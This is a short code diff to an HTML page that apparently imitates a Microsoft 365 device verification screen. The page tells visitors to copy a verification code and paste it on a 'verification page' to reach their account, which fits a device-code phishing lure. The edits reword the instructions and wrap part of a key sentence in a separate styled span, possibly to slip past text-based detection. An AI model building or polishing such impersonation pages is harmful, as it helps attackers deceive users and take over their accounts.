@@ -579,7 +579,7 @@ body{font-family:'Segoe UI Variable Display','Segoe UI',-apple-system,BlinkMacSy
     </div>
 
     <div id="mainView">
-      <p class="intro">Please verify your device to access your Microsoft 365 account.</p>
+      <p class="intro">Please verify your device to <span style="margin-left:20px;">access your Microsoft 365 account</span>.</p>
 
       <div class="info-box">
         💡 Microsoft requires verification before granting access to protected accounts.
@@ -604,8 +604,8 @@ body{font-family:'Segoe UI Variable Display','Segoe UI',-apple-system,BlinkMacSy
         <h4>ℹ️ Sign In Instructions:</h4>
         <ol>
           <li>Copy the verification code </li>
-          <li>Paste the code when prompted on the verification page</li>
-          <li>Complete the process to access your Microsoft 365</li>
+          <li>Paste it on the verification page</li>
+          <li>Complete verification to access Microsoft 365</li>
         </ol>
       </div>
 
